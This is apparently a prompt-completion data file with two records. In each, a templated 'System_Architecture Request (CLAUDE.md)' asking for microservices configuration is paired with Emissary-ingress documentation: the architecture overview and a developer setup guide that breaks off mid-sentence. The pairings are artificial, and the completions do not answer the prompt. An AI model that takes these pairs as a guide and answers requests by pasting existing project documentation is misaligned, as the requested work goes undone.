{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Emissary-Ingress Architecture\n\nIn this document you will find information about the internal design and architecture of the Emissary-ingress (formerly known as Ambassador API Gateway). Emissary-ingress provides a Kubernetes-native load balancer, API gateway and ingress controller that is built on top of [Envoy Proxy](https://www.envoyproxy.io).\n\n> Looking for end user guides for Emissary-ingress? You can check out the end user guides at <https://www.getambassador.io/docs/emissary/>.\n\n## Table of Contents\n\n- [Table of Contents](#table-of-contents)\n- [Overview](#overview)\n- [Custom Resource Definitions (CRD)](#custom-resource-definitions-crd)\n  - [Apiext](#apiext)\n  - [Additional Reading](#additional-reading)\n- [Emissary-ingress Container](#emissary-ingress-container)\n  - [Startup and Busyambassador](#startup-and-busyambassador)\n  - [Entrypoint](#entrypoint)\n    - [Watch All The Things (Watt)](#watch-all-the-things-watt)\n- [Diagd](#diagd)\n- [Ambex](#ambex)\n- [Envoy](#envoy)\n- [Testing Components](#testing-components)\n  - [kat-client](#kat-client)\n  - [kat-server](#kat-server)\n\n## Overview\n\nEmissary-ingress is a Kubernetes native API Gateway built on top of Envoy Proxy. We utilize Kubernetes CRDs to provide an expressive API to configure Envoy Proxy to handle routing traffic into your cluster.\n\nCheck [this blog post](https://blog.getambassador.io/building-ambassador-an-open-source-api-gateway-on-kubernetes-and-envoy-ed01ed520844) for additional context around the motivations and architecture decisions made for Emissary-ingress.\n\nAt the core of Emissary-ingress is Envoy Proxy which has very extensive configuration and extensions points. Getting this right can be challenging so Emissary-ingress provides Kubernetes Administrators and Developers a cloud-native way to configure Envoy using declarative yaml files. Here are the core components of Emissary-Ingress:\n\n- CRDs - extend K8s to enable Emissary-ingress's abstractions (*generated yaml*)\n- Apiext - A server that implements the Webhook Conversion interface for CRD's (**own container**)\n- Diagd - provides diagnostic ui, translates snapshots/ir into envoy configuration (*in-process*)\n- Ambex - gRPC server implementation of envoy xDS for dynamic envoy configration (*in-process*)\n- Envoy Proxy - Proxy that handles routing all user traffic (*in-process*)\n- Ambassador Agent - provides connectivity between cluster and Ambassador Cloud.  (*own container*)\n\n## Custom Resource Definitions (CRD)\n\nKubernetes allows extending its API through the use of [Customer Resource Definitions](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/) (aka CRDs) which allow solutions like Emissary-ingress to add custom resources to K8s and allow developers to treat them like any other K8s resource. CRDs provide validation, strong typing, structured data, versioning and are persisted in `etcd` along with the core Kuberenetes resources.\n\nEmissary-ingress provides a set of CRD's that are applied to a cluster and then are watched by Emissary-ingress. Emissary-ingress then uses the data from these CRD's along with the standard K8's resources (services, endpoints, etc...) to dynamically generate Envoy Proxy configuration. Depending on the version of Emissary-ingress there might be multiple versions of the CRD's that are suppported.\n\nYou can read the user documentation (see additional reading below) to find out more about all the various CRDs that are used and how to configure them. For understanding, how they are defined you can take a look in `pkg/getambassador.io/*` directory. In this directory, you will find a directory per version of the CRDs and for each version you will see the `Golang` structs that define the data structures that are used for each of the Emissary-ingress custom resources. It's recommended to read the `doc.go` file for information about API guidelines followed and how the comment markers are used by the build system.\n\nThe build system (`make`) uses [controller-gen](https://book.kubebuilder.io/reference/controller-gen.html) to generate the required YAML representation for the customer resources that can be found at `pkg/getambassador.io/crds.yaml`. This file is auto-generated and checked into the respository. This is the file that is applied to a cluster extending the Kubernetes API. If any changes are made to the custom resources then it needs to be re-generated and checked-in as part of your PR. Running `make generate` will trigger the generation of this file and other generated files (`protobufs`) that are checked into the respository as well. If you want to see more about the build process take a look at `build-aux/generate.mk`.\n\n> **Annotations**:  K8s allows developers to provide Annotations as well to the standard K8s Resources (Services, Ingress, etc...). Annotations were the preferred method of configuring early versions of Emissary-ingress but annotations did not provide validation and can be error prone. However, with the introduction of CRD's these are now the preferred method and annotations are only supported for backwards compatibility. We won't discuss the annotations much here due to this but rather making you aware that they exist.\n\n### Apiext\n\nKubernetes provides the ability to have multiple versions of Custom Resources similiar to the core K8s resources but it is only capable of having a single `storage` version that is persisted in `etcd`. Custom Resource Definitions can define a `ConversionWebHook` that Kubernetes will call whenever it receives a version that is not the storage version.\n\nYou can check the current storage version by looking at `pkg/getambassador.io/crds.yaml` and searching for the `storage: true` field and seeing which version is the storage version of the custom resource (*at the time of writing this it is `v2`*).\n\nThe `apiext` container is the Emissary-ingress's server implementation for the conversion webhook that is registered with our custom resources. Each custom resource will have a section similiar to the following in the `pkg/getambassador.io/crds.yaml`:\n\n```yaml\nconversion:\n    strategy: Webhook\n    webhook:\n      clientConfig:\n        service:\n          name: emissary-apiext\n          namespace: emissary-system\n      conversionReviewVersions:\n      - v1\n```\n\nThis is telling the Kubernetes API Server to call a WebHook using a `Service` within the cluster that is called `emissary-apiext` that can be found in the `emissary-system` namespace. It also states that our server implementation supports the `v1` version of the WebHook protocol so the K8s API Server will send the request and expect the response in the format for `v1`.\n\nThe implementation of the `apiext` server can be found in `cmd/apiext` and it leverages the [controller-runtime](https://pkg.go.dev/sigs.k8s.io/controller-runtime@v0.11.2starts) library which is vendored in `vendor/sigs.k8s.io/controller-runtime`. When this process starts up it will do the following:\n\n1. Register the Emissary-Ingress CRD schemas using the Go structs described previously\n2. Ensure a self-signed certificate is generated that our server can register with for `https`.\n3. Kick off a Go routine that handles watching our CRD's and enriching the WebHook Conversion section (*outlined in yaml above*) so that it includes our self-signed certs, port and path that the apiext server is listening on.\n4. Starts up our two servers one for container liveness/readiness probes and one for the WebHook implementation that performs the conversion between CRD versions.\n\n### Additional Reading\n\n- [Ambassador Labs Docs - Custom Resources](https://www.getambassador.io/docs/emissary/latest/topics/running/host-crd/)\n- [Ambassador Labs Docs - Declarative Configuration](https://www.getambassador.io/docs/emissary/latest/topics/concepts/gitops-continuous-delivery/#policies-declarative-configuration-and-custom-resource-definitions)\n- [K8s Docs - Custom Resouce Definition](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/)\n- [K8s Docs - Version CRD's](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definition-versioning/)\n- [K8s Docs - Webhook Conversion](<https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definition-versioning/#webhook-conversion>)\n\n## Emissary-ingress Container\n\nOne of the major goals of the Emissary-ingress is to simplify the deployment of Envoy Proxy in a cloud-native friendly way using containers and declarative CRD's. To honor this goal Emissary-ingress is packaged up into a single image with all the necessary components.\n\nThis section will give a high-level overview of each of these components and will help provide you direction on where you can find more information on each of the components.\n\n### Startup and Busyambassador\n\nEmissary-ingress has evolved over many years, many contributors and many versions of Kubernetes which has led to the internal components being implemented in different programming languages. Some of the components are pre-built binaries like envoy, first-party python programs and first-party golang binaries. To provide a single entrypoint for the container startup the Golang binary called `busyambassador` was introduced.\n\n/buildroot/ambassador/python/entrypoint.sh\n\nThe `busyambassador` binary provides a busybox like interface that dispatches the CMD's that are provided to a container for the various configured Golang binaries. This enables a single image to support multiple binaries on startup that are declartively set within a `deployment` in the `command` field when setting the image for a deployment. An example of this can be seen in the `ambassador-agent` deployment.\n\nThe image takes advantage of the `ENTRYPOINT` and `CMD` fields within a docker image manifest. You can see this in `builder/Dockerfile` in the final optimized image on the last line there is `ENTRYPOINT [ \"bash\", \"/buildroot/ambassador/python/entrypoint.sh\" ]`. This entrypoint cannot be overriden by the user and will run that bash script. By default the bash script will run the `entrypoint` binary which will be discussed in the next section but if passed a known binary name such as the `agent` example then `busyambassador` will run the correct command.\n\nTo learn more about `busyambassador` the code can be found:\n\n- `cmd/busyambassador`\n- `pkg/busy`\n\n> Note: the bash script will just exec into the `busyambassador` Golang binary in most cases and is still around for historical reasons and advanced debugging scenarios.\n\n> Additional Reading: If you want to know more about how containers work with entrypoint and commands then take a look at this blogpost. <https://www.bmc.com/blogs/docker-cmd-vs-entrypoint/>\n\n### Entrypoint\n\nThe `entrypoint` Golang binary is the default binary that `busyambassador` will run on container startup. It is the parent process for all the other processes that are run within the single `ambassador` image for Emissary-Ingress. At a high-level it starts and manages multiple go-routines, starts other child processes such as `diagd` (python program) and `envoy` (c++ compiled binary).\n\nHere is a list of everything managed by the `entrypoint` binary. Each one is indicated by whether its a child OS process that is started or a goroutine (*note: some of the OS processes are started/managed in goroutines but the core logic resides within the child process thus they are marked as such*).\n\n| Description                                                               |     Goroutine      |      OS.Exec       |\n| ------------------------------------------------------------------------- | :----------------: | :----------------: |\n| `diagd` - admin ui & config processor                                     |                    | :white_check_mark: |\n| `ambex` - the Envoy ADS Server                                            | :white_check_mark: |                    |\n| `envoy` - proxy routing data                                              |                    | :white_check_mark: |\n| SnapshotServer  - expose in-memory snapshot over localhost                | :white_check_mark: |                    |\n| ExternalSnapshotServer - Ambassador Cloud friendly exposed over localhost | :white_check_mark: |                    |\n| HealthCheck -  endpoints for K8s liveness/readiness probes                | :white_check_mark: |                    |\n| Watt - Watch k8s, consul & files for cluster changes                      | :white_check_mark: |                    |\n| Sidecar Processes - start various side car processes                      |                    | :white_check_mark: |\n\nSome of these items will be discussed in more detail but the best places to get started looking at the `entrypoint` is by looking at `cmd/entrypoint/entrypoint.go`.\n\n> To see how the container passes `entrypoint` as the default binary to run on container startup you can look at `python/entrypoint.sh` where it calls `exec busyambassador entrypoint \"$@\"` which will drop the shell process and will run the entrypoint process via busyambassador.\n\n#### Watch All The Things (Watt)\n\nWatch All The Things (aka Watt) is tasked with watching alot of things, hence the name :smile:. Specifically, its job is to watch for changes in the K8s Cluster and potentially Consul and file system changes. Watt is the beginning point for the end-to-end data flow from developer applying the configuration to envoy being configured. You can find the code for this in the `cmd/entrypoint/watcher.go` file.\n\nThe watching of the K8s Cluster changes is where Emissary-ingress will get most of its configuration by looking for K8s Resources (e.g. services,ingresss, etc...) as well as the Emissary-ingress CRD Resources (e.g. Host, Mapping, Listeners, etc...). A `consulWatcher`  will be started if a user has configured a Mapping to use the `ConsulResolver`. You can find this code in `cmd/entrypoint/consul.go`. The filesystem is also watched for changes to support `istio` and how it mounts certificates to the filesystem.\n\nHere is the general flow:\n\n```mermaid\nflowchart TD\n  subgraph watchers\n    K8s & consulW(Consul) & file(FileSystem)\n    K8s -.ConsulResolver.-> consulW\n    K8s & consulW(Consul) & file(FileSystem) --> sgen\n  end\n  API[K8s API] --> K8s\n  consul[Consul Manager] --> consulW\n  istio[Pod Filesystem] --> file\n\n  sgen(\"Snapshot \\n Generation\") --> update(\"Update Snapshot \\n(in-memory)\") --> diagd(Notify diagD);\n  update -.isEdgeStack?.-> AES(Notify AES)\n```\n\n## Diagd\n\nProvides two main functions:\n\n1. A Diagnostic Admin UI for viewing the current state of Emissary-Ingress\n2. Processing Cluster changes into Envoy ready configuration\n   1. This process has all the steps i'm outlining below\n\n- receives \"CONFIG\" event and pushes on queue\n- event queue loop listens for commands and pops them off\n- on CONFIG event it calls back to emissary Snapshot Server to grab current snapshot stored in-memory\n- It is serialized and stored in `/ambassador/snapshots/snapshot-tmp.yaml`.\n- A SecretHandler and Config is initialized\n- A ResourceFetcher (aka, parse the snapshot into an in-memory representation)\n- Generate IR and envoy configs (load_ir function)\n  - Take each Resource generated in ResourceFetcher and add it to the Config object as strongly typed objects\n  - Store Config Object in `/ambassador/snapshots/aconf-tmp.json`\n  - Check Deltas for Mappings cach and determine if we needs to be reset\n  - Create IR with a Config, Cache, and invalidated items\n    - IR is generated which basically just converts our stuff to strongly typed generic \"envoy\" items (handling filters, clusters, listeners, removing duplicates, etc...)\n  - IR is updated in-memory for diagd process\n  - IR is persisted to temp storage in `/ambassador/snapshots/ir-tmp.json`\n  - generate envoy config from IR and cache\n  - Split envoy config into bootstrap config, ads_config and clustermap config\n  - Validate econfig\n  - Rotate Snapshots for each of the files `aconf`, `econf`, `ir`, `snapshot` that get persisted in the snapshot path `/ambassador/snapshots`.\n    - Rotating them allows for seeing the history of snapshots up to a limit and then they are dropped\n    - this also renames the `-tmp` files written above into\n  - Persist bootstrap, envoy ads config and clustermap config to base directory:\n    - `/ambassador/bootstrap-ads.json` # this is used by envoy during startup to initial config itself and let it know about the static ADS Service\n    - `/ambassador/enovy/envoy.json` # this is used in `ambex` to generate the ADS snapshots along with the fastPath items\n    - `/ambassador/clustermap.json` # this might not be used either...\n  - Notify `envoy` and `ambex` that a new snapshot has been persisted using signal SIGHUP\n    - the Goroutine within `entrypoint` that starts up `envoy` is blocking waiting for this signal to start envoy\n    - the `ambex` process continuously listens for this signal and it triggers a configuration update for ambex.\n  - Update the appropriate status fields with metatdata by making calls to the `kubestatus` binary found in `cmd/kubestatus` which handles the communication to the cluster\n\n## Ambex\n\nThis is the gRPC server implementation of the envoy xDS v2 and v3 api's based on ...\n\n- listens for SIGHUP from diagd\n- converts `envoy.json` into in-memory snapshots that are cached for v2/v3\n- implements ADS v2/v3 Apis that envoy is configured to listen to\n\n## Envoy\n\nWe maintain our own [fork](https://github.com/datawire/envoy) of Envoy that includes some additional commits for implementing some features in Emissary-Ingress.\n\nEnvoy does all the heavy-lifting\n\n- does all routing, filtering, TLS termination, metrics collection, tracing, etc...\n- It is bootstraps from the output of diagd\n- It is dynamically updated using the xDS services and specifically the ADS service\n  - Our implementation of this is `ambex`\n\n## Testing Components\n\nTODO: talk about testing performed by kat-client/kat-server.\n\n### kat-client\n\nTODO: discuss the purpose of kat-client\n\n### kat-server\n\nTODO: discuss the purpose of kat-client\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "DevDocumentation/ARCHITECTURE.md", "language": "markdown", "complexity": "complex", "star_count": 4436, "quality_score": 0.6599999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 225}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Developing Emissary-ingress\n\nWelcome to the Emissary-ingress Community!\n\nThank you for contributing, we appreciate small and large contributions and look forward to working with you to make Emissary-ingress better.\n\nThis document is intended for developers looking to contribute to the Emissary-ingress project. In this document you will learn how to get your development environment setup and how to contribute to the project. Also, you will find more information about the internal components of Emissary-ingress and other questions about working on the project.\n\n> Looking for end user guides for Emissary-ingress? You can check out the end user guides at <https://www.getambassador.io/docs/emissary/>.\n\nAfter reading this document if you have questions we encourage you to join us on our [Slack channel](https://communityinviter.com/apps/cloud-native/cncf) in the #emissary-ingress channel.\n\n- [Code of Conduct](../Community/CODE_OF_CONDUCT.md)\n- [Governance](../Community/GOVERNANCE.md)\n- [Maintainers](../Community/MAINTAINERS.md)\n\n## Table of Contents\n\n- [Table of Contents](#table-of-contents)\n- [Development Setup](#development-setup)\n  - [Step 1: Install Build Dependencies](#step-1-install-build-dependencies)\n  - [Step 2: Clone Project](#step-2-clone-project)\n  - [Step 3: Configuration](#step-3-configuration)\n  - [Step 4: Building](#step-4-building)\n  - [Step 5: Push](#step-5-push)\n  - [Step 6: Deploy](#step-6-deploy)\n  - [Step 7: Dev-loop](#step-7-dev-loop)\n  - [What should I do next?](#what-should-i-do-next)\n- [Contributing](#contributing)\n  - [Submitting a Pull Request (PR)](#submitting-a-pull-request-pr)\n  - [Pull Request Review Process](#pull-request-review-process)\n  - [Rebasing a branch under review](#rebasing-a-branch-under-review)\n  - [Fixup commits during PR review](#fixup-commits-during-pr-review)\n- [Development Workflow](#development-workflow)\n  - [Branching Strategy](#branching-strategy)\n  - [Backport Strategy](#backport-strategy)\n    - [What if I need a patch to land in a previous supported version?](#what-if-i-need-a-patch-to-land-in-a-previous-supported-version)\n    - [What if my patch is only for a previous supported version?](#what-if-my-patch-is-only-for-a-previous-supported-version)\n    - [What if I'm still not sure?](#what-if-im-still-not-sure)\n  - [Merge Strategy](#merge-strategy)\n    - [What about merge commit strategy?](#what-about-merge-commit-strategy)\n- [Contributing to the Docs](#contributing-to-the-docs)\n- [Advanced Topics](#advanced-topics)\n  - [Running Emissary-ingress internals locally](#running-emissary-ingress-internals-locally)\n    - [Setting up diagd](#setting-up-diagd)\n    - [Changing the ambassador root](#changing-the-ambassador-root)\n    - [Getting envoy](#getting-envoy)\n    - [Shutting up the pod labels error](#shutting-up-the-pod-labels-error)\n    - [Extra credit](#extra-credit)\n  - [Debugging and Developing Envoy Configuration](#debugging-and-developing-envoy-configuration)\n  - [Making changes to Envoy](#making-changes-to-envoy)\n    - [1. Preparing your machine](#1-preparing-your-machine)\n    - [2. Setting up your workspace to hack on Envoy](#2-setting-up-your-workspace-to-hack-on-envoy)\n    - [3. Hacking on Envoy](#3-hacking-on-envoy)\n    - [4. Building and testing your hacked-up Envoy](#4-building-and-testing-your-hacked-up-envoy)\n    - [5. Test Devloop](#5-test-devloop)\n    - [6. Protobuf changes](#6-protobuf-changes)\n    - [7. Finalizing your changes](#7-finalizing-your-changes)\n    - [8. Final Checklist](#8-final-checklist)\n  - [Developing Emissary-ingress (Maintainers-only advice)](#developing-emissary-ingress-maintainers-only-advice)\n    - [Updating license documentation](#updating-license-documentation)\n    - [Upgrading Python dependencies](#upgrading-python-dependencies)\n- [FAQ](#faq)\n  - [How do I find out what build targets are available?](#how-do-i-find-out-what-build-targets-are-available)\n  - [How do I develop on a Mac with Apple Silicon?](#how-do-i-develop-on-a-mac-with-apple-silicon)\n  - [How do I develop on Windows using WSL?](#how-do-i-develop-on-windows-using-wsl)\n  - [How do I test using a private Docker repository?](#how-do-i-test-using-a-private-docker-repository)\n  - [How do I change the loglevel at runtime?](#how-do-i-change-the-loglevel-at-runtime)\n  - [Can I build from a docker container instead of on my local computer?](#can-i-build-from-a-docker-container-instead-of-on-my-local-computer)\n  - [How do I clear everything out to make sure my build runs like it will in CI?](#how-do-i-clear-everything-out-to-make-sure-my-build-runs-like-it-will-in-ci)\n  - [My editor is changing `go.mod` or `go.sum`, should I commit that?](#my-editor-is-changing-gomod-or-gosum-should-i-commit-that)\n  - [How do I debug \"This should not happen in CI\" errors?](#how-do-i-debug-this-should-not-happen-in-ci-errors)\n  - [How do I run Emissary-ingress tests?](#how-do-i-run-emissary-ingress-tests)\n  - [How do I type check my python code?](#how-do-i-type-check-my-python-code)\n\n## Development Setup\n\nThis section provides the steps for getting started developing on Emissary-ingress. There are a number of prerequisites that need to be setup. In general, our tooling tries to detect any missing requirements and provide a friendly error message. If you ever find that this is not the case please file an issue.\n\n> **Note:** To enable developers contributing on Macs with Apple Silicon, we ensure that the artifacts are built for `linux/amd64`\n> rather than the host `linux/arm64` architecture. This can be overriden using the `BUILD_ARCH` environment variable. Pull Request are welcome :).\n\n### Step 1: Install Build Dependencies\n\nHere is a list of tools that are used by the build system to generate the build artifacts, packaging them up into containers, generating  crds, helm charts and for running tests.\n\n- git\n- make\n- docker (make sure you can run docker commands as your dev user without sudo)\n- bash\n- rsync\n- golang - `go.mod` for current version\n- python (>=3.10.9)\n- kubectl\n- a kubernetes cluster (you need permissions to create resources, i.e. crds, deployments, services, etc...)\n- a Docker registry\n- bsdtar (Provided by libarchive-tools on Ubuntu 19.10 and newer)\n- gawk\n- jq\n- helm\n\n### Step 2: Clone Project\n\nIf you haven't already then this would be a good time to clone the project running the following commands:\n\n```bash\n# clone to your preferred folder\ngit clone https://github.com/emissary-ingress/emissary.git\n\n# navigate to project\ncd emissary\n```\n\n### Step 3: Configuration\n\nYou can configure the build system using environment variables, two required variables are used for setting the container registry and the kubeconfig used.\n\n> **Important**: the test and build system perform destructive operations against your cluster. Therefore, we recommend that you\n> use a development cluster. Setting the DEV_KUBECONFIG variable described below ensures you don't accidently perform actions on a production cluster.\n\nOpen a terminal in the location where you cloned the repository and run the following commands:\n\n```bash\n# set container registry using `export DEV_REGISTRY=<your-registry>\n# note: you need to be logged in and have permissions to push\n# Example:\nexport DEV_REGISTRY=docker.io/parsec86\n\n# set kube config file using `export DEV_KUBECONFIG=<dev-kubeconfig>`\n# your cluster needs the ability to read from the configured container registry\nexport DEV_KUBECONFIG=\"$HOME/.kube/dev-config.yaml\"\n\n```\n\n### Step 4: Building\n\nThe build system for this project leverages `make` and multi-stage `docker` builds to produce the following containers:\n\n- `emissary.local/emissary` - single deployable container for Emissary-ingress\n- `emissary.local/kat-client` - test client container used for testing\n- `emissary.local/kat-server` - test server container used for testing\n\nUsing the terminal session you opened in step 2, run the following commands\n\n>\n\n```bash\n# This will pull and build the necessary docker containers and produce multiple containers.\n# If this is the first time running this command it will take a little bit while the base images are built up and cached.\nmake images\n\n# verify containers were successfully created, you should also see some of the intermediate builder containers as well\ndocker images | grep emissary.local\n```\n\n*What just happened?*\n\nThe build system generated a build container that pulled in envoy, the build dependencies, built various binaries from within this project and packaged them into a single deployable container. More information on this can be found in the [Architecture Document](ARCHITECTURE.md).\n\n### Step 5: Push\n\nNow that you have successfully built the containers its time to push them to your container registry which you setup in step 2.\n\nIn the same terminal session you can run the following command:\n\n```bash\n# re-tags the images and pushes them to your configured container registry\n# docker must be able to login to your registry and you have to have push permissions\nmake push\n\n# you can view the newly tag images by running\ndocker images | grep <your -registry>\n\n# alternatively, we have two make targets that provide information as well\nmake env\n\n# or in a bash export friendly format\nmake export\n```\n\n### Step 6: Deploy\n\nNow its time to deploy the container out to your Kubernetes cluster that was configured in step 2. Hopefully, it is already becoming apparent that we love to leverage Make to handle the complexity for you :).\n\n```bash\n# generate helm charts and K8's Configs with your container swapped in and apply them to your cluster\nmake deploy\n\n# check your cluster to see if emissary is running\n# note: kubectl doesn't know about  DEV_KUBECONFIG so you may need to ensure KUBECONFIG is pointing to the correct cluster\nkubectl get pod -n ambassador\n```\n\n🥳 If all has gone well then you should have your development environment setup for building and testing Emissary-ingress.\n\n### Step 7: Dev-loop\n\nNow that you are all setup and able to deploy a development container of Emissary-ingress to a cluster, it is time to start making some changes.\n\nLookup an issue that you want to work on, assign it to yourself and if you have any questions feel free to ping us on slack in the #emissary-dev channel.\n\nMake a change to Emissary-ingress and when you want to test it in a live cluster just re-run\n\n`make deploy`\n\nThis will:\n\n- recompile the go binary\n- rebuild containers\n- push them to the docker registry\n- rebuild helm charts and manifest\n- reapply manifest to cluster and re-deploy Emissary-ingress to the cluster\n\n> *Do I have to run the other make targets `make images` or `make push` ?*\n> No you don't have to because `make deploy` will actually run those commands for you. The steps above were meant to introduce you to the various make targets so that you aware of them and have options when developing.\n\n### What should I do next?\n\nNow that you have your dev system up and running here are some additional content that we recommend you check out:\n\n- [Emissary-ingress Architecture](ARCHITECTURE.md)\n- [Contributing Code](#contributing)\n- [Contributing to Docs](#contributing-to-the-docs)\n- [Advanced Topics](#advanced-topics)\n- [Faq](#faq)\n\n## Contributing\n\nThis section goes over how to contribute code to the project and how to get started contributing. More information on how we manage our branches can be found below in [Development Workflow](#development-workflow).\n\nBefore contributing be sure to read our [Code of Conduct](../Community/CODE_OF_CONDUCT.md) and [Governance](../Community/GOVERNANCE.md) to get an understanding of how our project is structured.\n\n### Submitting a Pull Request (PR)\n\n> If you haven't set up your development environment then please see the [Development Setup](#development-setup) section.\n\nWhen submitting a Pull Request (PR) here are a set of guidelines to follow:\n\n1. Search for an [existing issue](https://github.com/emissary-ingress/emissary/issues) or create a [new issue](https://github.com/emissary-ingress/emissary/issues/new/choose).\n\n2. Be sure to describe your proposed change and any open questions you might have in the issue. This allows us to collect historical context around an issue, provide feedback on the proposed solution and discuss what versions a fix should target.\n\n3. If you haven't done so already create a fork of the respository and clone it locally\n\n   ```shell\n   git clone <your-fork>\n   ```\n\n4. Cut a new patch branch from `master`:\n\n   ```shell\n   git checkout master\n   git checkout -b my-patch-branch master\n   ```\n\n5. Make necessary code changes.\n\n   - Make sure you include test coverage for the change, see [How do I run Tests](#how-do-i-run-emissary-ingress-tests)\n   - Ensure code linting is passing by running `make lint`\n   - Code changes must have associated documentation updates.\n      - Make changes in <https://github.com/datawire/ambassador-docs> as necessary, and include a reference to those changes the pull request for your code changes.\n      - See [Contributing to Docs](#contributing-to-the-docs) for more details.\n\n   > Smaller pull requests are easier to review and can get merged faster thus reducing potential for merge conflicts so it is recommend to keep them small and focused.\n\n6. Commit your changes using descriptive commit messages.\n   - we **require** that all commits are signed off so please be sure to commit using the `--signoff` flag, e.g. `git commit --signoff`\n   - commit message should summarize the fix and motivation for the proposed fix. Include issue # that the fix looks to address.\n   - we are \"ok\" with multiple commits but we may ask you to squash some commits during the PR review process\n\n7. Push your branch to your forked repository:\n\n   > It is good practice to make sure your change is rebased on the latest master to ensure it will merge cleanly so if it has been awhile since you rebased on upstream you should do it now to ensure there are no merge conflicts\n\n   ```shell\n   git push origin my-patch-branch\n   ```\n\n8. Submit a Pull Request from your fork targeting upstream `emissary/master`.\n\nThanks for your contribution! One of the [Maintainers](../Community/MAINTAINERS.md) will review your PR and discuss any changes that need to be made.\n\n### Pull Request Review Process\n\nThis is an opportunity for the Maintainers to review the code for accuracy and ensure that it solves the problem outlined in the issue. This is an iterative process and meant to ensure the quality of the code base. During this process we may ask you to break up Pull Request into smaller changes, squash commits, rebase on master, etc...\n\nOnce you have been provided feedback:\n\n1. Make the required updates to the code per the review discussion\n2. Retest the code and ensure linting is still passing\n3. Commit the changes and push to Github\n   - see [Fixup Commits](#fixup-commits-during-pr-review) below\n4. Repeat these steps as necessary\n\nOnce you have **two approvals** then one of the Maintainers will merge the PR.\n\n:tada: Thank you for contributing and being apart of the Emissary-ingress Community!\n\n### Rebasing a branch under review\n\nMany times the base branch will have new commits added to it which may cause merge conflicts with your open pull request. First, a good rule of thumb is to make pull request small so that these conflicts are less likely to occur but this is not always possible when have multiple people working on similiar features. Second, if it is just addressing commit feedback a `fixup` commit is also a good option so that the reviewers can see what changed since their last review.\n\nIf you need to address merge conflicts then it is preferred that you use **Rebase** on the base branch rather than merging base branch into the feature branch. This ensures that when the PR is merged that it will cleanly replay on top of the base branch ensuring we maintain a clean linear history.\n\nTo do a rebase you can do the following:\n\n```shell\n# add emissary.git as a remote repository, only needs to be done once\ngit remote add upstream https://github.com/emissary-ingress/emissary.git\n\n# fetch upstream master\ngit fetch upstream master\n\n# checkout local master and update it from upstream master\ngit checkout master\ngit pull -ff upstream master\n\n# rebase patch branch on local master\ngit checkout my-patch-branch\ngit rebase -i master\n```\n\nOnce the merge conflicts are addressed and you are ready to push the code up you will need to force push your changes because during the rebase process the commit sha's are re-written and it has diverged from what is in your remote fork (Github).\n\nTo force push a branch you can:\n\n```shell\ngit push head --force-with-lease\n```\n\n> Note: the `--force-with-lease` is recommended over `--force` because it is safer because it will check if the remote branch had new commits added during your rebase. You can read more detail here: <https://itnext.io/git-force-vs-force-with-lease-9d0e753e8c41>\n\n### Fixup commits during PR review\n\nOne of the major downsides to rebasing a branch is that it requires force pushing over the remote (Github) which then marks all the existing review history outdated. This makes it hard for a reviewer to figure out whether or not the new changes addressed the feedback.\n\nOne way you can help the reviewer out is by using **fixup** commits. Fixup commits are special git commits that append `fixup!` to the subject of a commit. `Git` provides tools for easily creating these and also squashing them after the PR review process is done.\n\nSince this is a new commit on top of the other commits, you will not lose your previous review and the new commit can be reviewed independently to determine if the new changes addressed the feedback correctly. Then once the reviewers are happy we will ask you to squash them so that we when it is merged we will maintain a clean linear history.\n\nHere is a quick read on it: <https://jordanelver.co.uk/blog/2020/06/04/fixing-commits-with-git-commit-fixup-and-git-rebase-autosquash/>\n\nTL;DR;\n\n```shell\n# make code change and create new commit\ngit commit --fixup <sha>\n\n# push to Github for review\ngit push\n\n# reviewers are happy and ask you to do a final rebase before merging\ngit rebase -i --autosquash master\n\n# final push before merging\ngit push --force-with-lease\n```\n\n## Development Workflow\n\nThis section introduces the development workflow used for this repository. It is recommended that both Contributors, Release Engineers and Maintainers familiarize themselves with this content.\n\n### Branching Strategy\n\nThis repository follows a trunk based development workflow. Depending on what article you read there are slight nuances to this so this section will outline how this repository interprets that workflow.\n\nThe most important branch is `master` this is our **Next Release** version and it should always be in a shippable state. This means that CI should be green and at any point we can decided to ship a new release from it. In a traditional trunk based development workflow, developers are encouraged to land partially finished work daily and to keep that work hidden behind feature flags. This repository does **NOT** follow that and instead if code lands on master it is something we are comfortable with shipping.\n\nWe ship release candidate (RC) builds from the `master` branch (current major) and also from `release/v{major.minor}` branches (last major version) during our development cycles. Therefore, it is important that it remains shippable at all times!\n\nWhen we do a final release then we will cut a new `release/v{major.minor}` branch. These are long lived release branches which capture a snapshot in time for that release. For example here are some of the current release branches (as of writing this):\n\n- release/v3.2\n- release/v3.1\n- release/v3.0\n- release/v2.4\n- release/v2.3\n- release/v1.14\n\nThese branches contain the codebase as it was at that time when the release was done. These branches have branch protection enabled to ensure that they are not removed or accidently overwritten. If we needed to do a security fix or bug patch then we may cut a new `.Z` patch release from an existing release branch. For example, the `release/v2.4` branch is currently on `2.4.1`.\n\nAs you can see we currently support mutliple major versions of Emissary-ingress and you can read more about our [End-of-Life Policy](https://www.getambassador.io/docs/emissary/latest/about/aes-emissary-eol/).\n\nFor more information on our current RC and Release process you can find that in our [Release Wiki](https://github.com/emissary-ingress/emissary/wiki).\n\n### Backport Strategy\n\nSince we follow a trunk based development workflow this means that the majority of the time your patch branch will be based off from `master` and that most Pull Request will target `master`.\n\nThis ensures that we do not miss bug fixes or features for the \"Next\" shippable release and simplifies the mental-model for deciding how to get started contributing code.\n\n#### What if I need a patch to land in a previous supported version?\n\nLet's say I have 